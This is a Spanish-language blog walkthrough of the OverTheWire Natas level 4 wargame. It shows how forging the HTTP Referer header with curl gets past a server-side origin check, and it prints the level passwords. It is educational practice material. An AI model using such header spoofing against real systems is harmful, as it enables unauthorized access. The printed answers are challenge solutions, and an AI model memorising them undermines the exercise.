---
title: 'CTF OverTheWire: Natas4'
author: Alevsk
type: post
date: 2018-06-02T19:14:54+00:00
url: /2018/06/ctf-overthewire-natas4/
categories:
  - Ethical Hacking
  - Linux
  - Mac
  - IT News
  - Programming
  - Technology
  - Tutorials
tags:
  - capture the flag
  - ctf
  - hacking
  - Ethical Hacking
  - Linux
  - Programming
  - Technology
  - Tutorials

---
[![](/images/Screen-Shot-2018-05-29-at-1.57.38-AM-1200x596.png)](http://www.alevsk.com/2018/05/ctf-overthewire-natas1/screen-shot-2018-05-29-at-1-57-38-am/)

Continuamos con la serie de tutoriales del [CTF Natas](http://overthewire.org/wargames/natas/), ahora toca el turno de [natas4](http://overthewire.org/wargames/natas/natas4.html).

```bash
Natas Level 3 → Level 4  
Username: natas4  
URL: http://natas4.natas.labs.overthewire.org
```

Utilizamos la bandera obtenida en el reto anterior y accedemos a la URL indicada en las instrucciones del reto, veremos una pantalla como la siguiente.

[![](/images/Screen-Shot-2018-06-02-at-1.18.49-PM-1200x436.png)](http://www.alevsk.com/2018/06/ctf-overthewire-natas4/screen-shot-2018-06-02-at-1-18-49-pm/)

Como lo hemos hecho anteriormente, revisamos el codigo fuente pero no encontramos nada interesante, tampoco hay archivo [robots.txt](https://www.alevsk.com/2018/05/ctf-overthewire-natas3/)

Nos concentramos en el mensaje que aparece en la pantalla: **Access disallowed. You are visiting from “" while authorized users should come only from “http://natas5.natas.labs.overthewire.org/"**

> Acceso deshabilitado. Nos estas visitando de “" mientras que los usuarios autorizados deberian de venir desde “http://natas5.natas.labs.overthewire.org/"

El mensaje anterior sugiere algún tipo de validación del lado del servidor en donde se revisa el origen de la petición, damos click en el link de refresh, inspeccionamos las cabeceras del request utilizando google developer toolbars y observamos que el mensaje de la pagina cambio.

[![](/images/Screen-Shot-2018-06-02-at-1.41.55-PM-1200x367.png)](http://www.alevsk.com/2018/06/ctf-overthewire-natas4/screen-shot-2018-06-02-at-1-41-55-pm/)

Observamos una cabecera interesante llamada **referer** cuyo valor actual es **http://natas4.natas.labs.overthewire.org/**, veamos si es posible definir nuestro propio valor utilizando [cURL](https://www.alevsk.com/2018/05/ctf-overthewire-natas1/).

[![](/images/Screen-Shot-2018-06-02-at-1.41.49-PM-1200x408.png)](http://www.alevsk.com/2018/06/ctf-overthewire-natas4/screen-shot-2018-06-02-at-1-41-49-pm/)

Abrimos una consola y escribimos

```bash
$ curl –help  
Usage: curl [options…] <url>  
Options: (H) means HTTP/HTTPS only, (F) means FTP only  
….  
-r, –range RANGE Retrieve only the bytes within RANGE  
–raw Do HTTP "raw"; no transfer decoding (H)  
-e, –referer Referer URL (H)  
-J, –remote-header-name Use the header-provided filename (H)  
….
```

Genial, con el parámetro **-e** / **–referer** podemos definir nuestra propia URL.

```bash
○ → curl –user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ –referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/  
<html>
<head>
<!--– This stuff in the header has nothing to do with the level –-->
<link href="http://natas.labs.overthewire.org/css/level.css" rel="stylesheet" type="text/css"/>
<link href="http://natas.labs.overthewire.org/css/jquery-ui.css" rel="stylesheet"/>
<link href="http://natas.labs.overthewire.org/css/wechall.css" rel="stylesheet"/>
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq  
<br/>
<div id="viewsource">[Refresh page](index.php)</div>
</div>
</body>
</html>
```

La bandera para acceder a **natas5** es **iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq**

> * Aprendimos que el [referer header](https://en.wikipedia.org/wiki/HTTP_referer) no es garantía de que el request viene del origen que el cliente nos esta diciendo, esto podría ser considerado una vulnerabilidad de [Broken Access Control](https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control) de acuerdo al [top 10 de vulnerabilidad de OWASP](https://www.owasp.org/index.php/Top_10-2017_Top_10). 

Happy hacking 🙂</url>